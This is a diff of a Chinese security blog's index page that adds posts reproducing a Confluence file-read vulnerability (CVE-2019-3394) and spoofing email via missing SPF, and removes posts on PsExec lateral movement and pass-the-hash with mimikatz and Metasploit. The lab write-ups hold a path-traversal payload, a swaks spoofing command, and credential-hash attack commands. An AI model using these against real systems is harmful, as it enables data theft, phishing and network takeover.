@@ -393,6 +393,305 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://sherlocz.github.io/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sher10ck">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sriracha :)">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/" class="post-title-link" itemprop="url">Confluence文件读取漏洞复现(CVE-2019-3394)</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-03-24 10:30:01 / 修改时间：12:08:00" itemprop="dateCreated datePublished" datetime="2020-03-24T10:30:01+08:00">2020-03-24</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>6.1.0 &lt;= version &lt; 6.6.16<br>6.7.0 &lt;= version &lt; 6.13.7<br>6.14.0 &lt;= version &lt; 6.15.8</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用P师傅的vulhub直接上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker-compose</span><br><span class="line"># Download the latest version of the vulhub </span><br><span class="line">git clone https://github.com/vulhub/vulhub.git  </span><br><span class="line"># Entry vulnerability directory </span><br><span class="line">cd /confluence/CVE-2019-3396/</span><br><span class="line"># Compile (optional) </span><br><span class="line">docker-compose build </span><br><span class="line"># Run </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
+<p>安装完成之后本地会开启8090端口，我们根据导向进行安装<br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/1.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/2.png" alt><br>这里我们需要去官网获取一个licence，注意这里的Server ID，成功获取之后在Setup页面点击下一步，等他转圈圈就行了<br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/3.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/4.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/5.png" alt><br>然后稀里糊涂就安装成功了。</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>创建页面的时候抓包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT /rest/api/content/65603?status=draft HTTP/1.1</span><br><span class="line">Host: 192.168.75.138:8090</span><br><span class="line">Content-Length: 373</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</span><br><span class="line">Content-Type: application/json; charset=UTF-8</span><br><span class="line">Origin: http://192.168.75.138:8090</span><br><span class="line">Referer: http://192.168.75.138:8090/pages/resumedraft.action?draftId=65603&amp;draftShareId=e3bf8f62-5cdc-4586-ae67-0098ed31f5a5</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=EB2B904418498E2A22446B8A4D44664A</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;status&quot;:&quot;current&quot;,&quot;title&quot;:&quot;123123&quot;,&quot;space&quot;:&#123;&quot;key&quot;:&quot;SHER&quot;&#125;,&quot;body&quot;:&#123;&quot;editor&quot;:&#123;&quot;value&quot;:&lt;p&gt;1231231&lt;/p&gt;</span><br><span class="line">&quot;,&quot;representation&quot;:&quot;editor&quot;,&quot;content&quot;:&#123;&quot;id&quot;:&quot;65603&quot;&#125;&#125;&#125;,&quot;id&quot;:&quot;65603&quot;,&quot;type&quot;:&quot;page&quot;,&quot;version&quot;:&#123;&quot;number&quot;:1,&quot;minorEdit&quot;:true,&quot;syncRev&quot;:&quot;0.2ROrHE4DizkcCc1u6UtkBrc.10&quot;&#125;,&quot;ancestors&quot;:[&#123;&quot;id&quot;:&quot;65584&quot;,&quot;type&quot;:&quot;page&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure></p>
+<p>将其中的value值修改成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;img class=\&quot;confluence-embedded-image\&quot; src=\&quot;/packages/../web.xml\&quot; /&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后再导出word的时候抓包</p>
+<p><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/6.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/7.png" alt></p>
+<p>RCE<br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/8.png" alt></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/jas502n/CVE-2019-3394" title="https://github.com/jas502n/CVE-2019-3394" target="_blank" rel="noopener">CVE-2019-3394</a><br><a href="https://github.com/Yt1g3r/CVE-2019-3396_EXP" title="https://github.com/Yt1g3r/CVE-2019-3396_EXP" target="_blank" rel="noopener">https://github.com/Yt1g3r/CVE-2019-3396_EXP</a></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://sherlocz.github.io/2020/03/23/利用spf伪造邮箱发送/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sher10ck">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sriracha :)">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2020/03/23/利用spf伪造邮箱发送/" class="post-title-link" itemprop="url">利用spf伪造邮箱发送</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-03-23 12:40:56 / 修改时间：12:49:58" itemprop="dateCreated datePublished" datetime="2020-03-23T12:40:56+08:00">2020-03-23</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="SPF"><a href="#SPF" class="headerlink" title="SPF"></a>SPF</h1><p>看网易官方对SPF的定义：<br><img src="/2020/03/23/利用spf伪造邮箱发送/163.png" alt></p>
+<h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>首先用nslookup命令查看是否存在SPF记录<br><img src="/2020/03/23/利用spf伪造邮箱发送/spf.png" alt></p>
+<p>这里并没有设置SPF，没有SPF字样出现</p>
+<p>Kali启动，输入命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">swaks --to xxx@163.com --from test_nospf@xxx.cn  --body &apos;This is a test mailing&apos; --header &apos;Subject: test&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">常用Swaks指令</span><br><span class="line">--ehlo     [helo-string]：伪造ehlo头信息</span><br><span class="line">--header     [header-and-data]：伪造From、Subject、Message-Id、X-Mailer等头信息</span><br><span class="line">--data     [data-portion]：伪造DATA的全部内容，可直接将邮件源码作为选项</span><br><span class="line">--attach     [attachment-specification]：添加附件</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/03/23/利用spf伪造邮箱发送/success.png" alt></p>
+<p>发送成功，看邮箱收到没有</p>
+<p><img src="/2020/03/23/利用spf伪造邮箱发送/mail.png" alt></p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[你熟悉得那些诱人的邮件都是如何伪造得？ “<a href="https://mp.weixin.qq.com/s?__biz=MzAwMzc2MDQ3NQ==&amp;mid=2247483932&amp;idx=1&amp;sn=2fdbd77c441354a3b6a4a4b39c4a234f&amp;chksm=9b370a28ac40833ef7f5773e09ea0d38155e5b673e1a63209e81a5ff4fc9e0d1ecc967a1408c&amp;mpshare=1&amp;scene=1&amp;srcid=0323QOmo5lj78Oc1T5xsiQYc&amp;sharer_sharetime=1584933653495&amp;sharer_shareid=603d3452a1da35dfaf9195077f79f3de&amp;key=d3059eb8c008ccac8f45b250923aca43ac9c6c49c8267ffb82d154dcea815a41811dbfb26a5eff335dc717d552f2e0d0e9542bb27c9a11e2b2d00b6aebb8f29e79f3ca5b1b42b32a7b48ff156970177c&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10&amp;version=62080085&amp;lang=zh_CN&amp;exportkey=A947Qcj62k29xmJtfgTCZuk%3D&amp;pass_ticket=hFiImDgckOZoXTtlh24T0c93VTdcIgyprkEcstqbILTiVo%2BeNPKDXHJgWazcpizo&quot;" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzAwMzc2MDQ3NQ==&amp;mid=2247483932&amp;idx=1&amp;sn=2fdbd77c441354a3b6a4a4b39c4a234f&amp;chksm=9b370a28ac40833ef7f5773e09ea0d38155e5b673e1a63209e81a5ff4fc9e0d1ecc967a1408c&amp;mpshare=1&amp;scene=1&amp;srcid=0323QOmo5lj78Oc1T5xsiQYc&amp;sharer_sharetime=1584933653495&amp;sharer_shareid=603d3452a1da35dfaf9195077f79f3de&amp;key=d3059eb8c008ccac8f45b250923aca43ac9c6c49c8267ffb82d154dcea815a41811dbfb26a5eff335dc717d552f2e0d0e9542bb27c9a11e2b2d00b6aebb8f29e79f3ca5b1b42b32a7b48ff156970177c&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10&amp;version=62080085&amp;lang=zh_CN&amp;exportkey=A947Qcj62k29xmJtfgTCZuk%3D&amp;pass_ticket=hFiImDgckOZoXTtlh24T0c93VTdcIgyprkEcstqbILTiVo%2BeNPKDXHJgWazcpizo&quot;</a>)</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://sherlocz.github.io/2020/03/23/App反汇编步骤/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1700,321 +1999,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://sherlocz.github.io/2020/02/04/利用PsExec进行横向渗透/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="sher10ck">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sriracha :)">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2020/02/04/利用PsExec进行横向渗透/" class="post-title-link" itemprop="url">利用PsExec进行横向渗透</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2020-02-04 17:44:00 / 修改时间：19:30:38" itemprop="dateCreated datePublished" datetime="2020-02-04T17:44:00+08:00">2020-02-04</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><ul>
-<li>需要目标机器开启了ADMIN$共享(默认开启)</li>
-<li>建立了IPC连接，可以不输入账号密码连接到CMD窗口</li>
-</ul>
-<p>下载地址:<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p>
-<p>优点：可直接获取SYSTEM权限的交互式shell<br>缺点：利用时会产生一个Psecex的服务，这个服务会产生日志文件，容易溯源</p>
-<h1 id="模拟利用过程"><a href="#模拟利用过程" class="headerlink" title="模拟利用过程"></a>模拟利用过程</h1><ul>
-<li>Win Server 2012 R2(DC)</li>
-<li>Win 7(域中的一台机器)</li>
-</ul>
-<h2 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h2><p>我们现在用Win7去攻击域控，在win7下cmd</p>
-<p>首先看看ip<br><img src="/2020/02/04/利用PsExec进行横向渗透/ipconfig.png" alt><br>没发现域控在那台机器，win7的ip是192.168.43.102<br><img src="/2020/02/04/利用PsExec进行横向渗透/domain.png" alt><br>查看域<br><img src="/2020/02/04/利用PsExec进行横向渗透/hacke.png" alt><br>查看域内其他主机<br><img src="/2020/02/04/利用PsExec进行横向渗透/nslookup.png" alt><br>利用nslookup定位DC</p>
-<p>这里我并未对DC做设置，所以默认的时候ADMIN$是共享状态，你也可以使用net share命令查看共享的资源</p>
-<h2 id="无IPC连接"><a href="#无IPC连接" class="headerlink" title="无IPC连接"></a>无IPC连接</h2><p>我们在win7的机器上查看了解情况，若无共享的连接，则我们在使用PsExec的时候需要使用账号密码进行验证<br><img src="/2020/02/04/利用PsExec进行横向渗透/use.png" alt></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\192.168.43.100 -u username -p password</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/02/04/利用PsExec进行横向渗透/none.png" alt><br>无需弹出新的cmd窗口，直接拿下域控</p>
-<h2 id="有IPC连接"><a href="#有IPC连接" class="headerlink" title="有IPC连接"></a>有IPC连接</h2><p><img src="/2020/02/04/利用PsExec进行横向渗透/yes.png" alt></p>
-<p>这个时候无需验证账号密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\192.168.43.100 cmd.exe</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2020/02/04/利用PsExec进行横向渗透/2.png" alt><br>成功啦~</p>
-<h2 id="Msf中的Psexec模块"><a href="#Msf中的Psexec模块" class="headerlink" title="Msf中的Psexec模块"></a>Msf中的Psexec模块</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set RHOST 192.168.43.100</span><br><span class="line">set smbuser usernmae</span><br><span class="line">set smbpass password</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/02/04/利用PsExec进行横向渗透/msf.png" alt></p>
-<p>这样就利用成功了</p>
-<p>总的来说这个psexec利用的方式就是，只要服务器上面有连接的IPC，就可以搞出cmd。</p>
-<p>差不多就这样吧</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://sherlocz.github.io/2020/02/03/Hash传递相关知识点/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="sher10ck">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sriracha :)">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2020/02/03/Hash传递相关知识点/" class="post-title-link" itemprop="url">Hash传递相关知识点</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2020-02-03 15:09:28 / 修改时间：17:18:40" itemprop="dateCreated datePublished" datetime="2020-02-03T15:09:28+08:00">2020-02-03</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="PTH介绍"><a href="#PTH介绍" class="headerlink" title="PTH介绍"></a>PTH介绍</h1><p>当我们拿到一台服务器的SYSTEM权限之后，利用工具获取到了服务器的HASH值，但是无法抓取到明文密码或者密文解不开，这个时候我们可以尝试进行Pass The Hash(Hash传递)进行横向的渗透攻击</p>
-<h1 id="利用mimikatz进行pth"><a href="#利用mimikatz进行pth" class="headerlink" title="利用mimikatz进行pth"></a>利用mimikatz进行pth</h1><p><img src="/2020/02/03/Hash传递相关知识点/ntlm.png" alt><br>这里的实验机器是windows server 2012 r2(dc)，发现并没有抓取到明文，这个密文设置的密码也解不出来，注意这里的SID为500.</p>
-<p>然后接着在攻击机器上(在域控中的机器)mimikatz中输入如下的命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:Administrator /domain:domainname /ntlm:519c985a849313d2c8029b293b57de1f</span><br></pre></td></tr></table></figure></p>
-<p>效果是这个样子的，然后他会弹出一个新的cmd窗口<br><img src="/2020/02/03/Hash传递相关知识点/mimikatz.png" alt></p>
-<p>这种方式会感觉有些鸡肋，为什么呢，因为弹出新的cmd窗口，你得登上域内的一台3389才能利用这种方式啊，要是登不上域内的远程桌面，命令行下这种方式不行，就像win10的bypass uac一样，不是很喜欢这种弹出新框框的东西 :)</p>
-<h1 id="利用msf进行pth"><a href="#利用msf进行pth" class="headerlink" title="利用msf进行pth"></a>利用msf进行pth</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set rhosts 192.168.15.181</span><br><span class="line">set SMBUser rabbitmask</span><br><span class="line">set SMBPass aad3b435b51404eeaad3b435b51404ee:0515322a55615056aaabb044a48463a4</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/02/03/Hash传递相关知识点/msf.png" alt><br>不过这里注意一下HASH的值，mimikatz只需要ntlm就能进行传递，msf的这个模块需要LM:NTLM HASH<br><img src="/2020/02/03/Hash传递相关知识点/hash.png" alt><br>就是这个样子的</p>
-<h1 id="KB2871997"><a href="#KB2871997" class="headerlink" title="KB2871997"></a>KB2871997</h1><p>微软在2014年5月份发布的这个KB2871997补丁，禁止了本地管理员账户对远程计算机进行了解，所以我们无法使用psexec、wni、smbexec、schtasks、at等命令对远程主机进行操作，也无法使用PTH方法进行横向渗透，但是唯独SID为500的账号可以使用PTH去横向，这个账号去进行PTH不受到该补丁的影响。</p>
-<p>一般在域环境下SID为500的DC就是域控账号了。</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2062,7 +2046,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">85</span>
+                    <span class="site-state-item-count">87</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
